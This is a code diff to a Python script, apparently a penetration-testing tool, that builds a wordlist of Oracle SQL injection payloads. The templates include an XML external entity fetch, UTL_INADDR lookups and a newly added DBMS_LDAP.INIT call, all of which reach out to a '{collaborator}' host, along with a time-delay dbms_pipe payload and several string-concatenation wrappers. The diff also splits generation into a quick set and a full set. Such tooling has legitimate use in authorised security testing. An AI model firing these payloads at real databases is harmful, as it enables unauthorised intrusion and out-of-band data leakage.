@@ -30,6 +30,7 @@ suffixes = [
 templates = [
     'SELECT EXTRACTVALUE(xmltype(\'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{collaborator}/"> %remote;]>\'),\'/l\') FROM dual',
     'SELECT UTL_INADDR.get_host_address("{collaborator}")',
+    'SELECT SYS.DBMS_LDAP.INIT("{collaborator}",80) FROM DUAL',
     '123=dbms_pipe.receive_message(("a"),{time})'
 ]
 
@@ -37,15 +38,15 @@ templates = [
 concats = [
     ['"||', '||"'],
     ['"||(', ')||"'],
-    ['||(', '']
+    ['||', ''],
+    ['||(', ')']
 ]
 
-def generate():
-    wordlist = []
-
+def generate_quick():
     # injection via string concatination
     # - can concat int and str due to 'implicit' conversion
     # - TODO: test if you can do this even if this causes an error with ints
+    wordlist = []
     for concat in concats:
         for template in templates:
             word = concat[0] + template + concat[1]
@@ -53,7 +54,11 @@ def generate():
 
             word = concat[0].replace('"', '\'') + template + concat[1].replace('"', '\'')
             wordlist.append(word)
+    wordlist = list(set(wordlist))
+    return wordlist
 
+
+def generate():
     # injection via operators
     for prefix in prefixes:
         for sqlOperator in sqlOperators:
@@ -65,4 +70,5 @@ def generate():
                     wordlist.append(word)
     
     wordlist = list(set(wordlist))
+    wordlist = generate_quick() + wordlist
     return wordlist
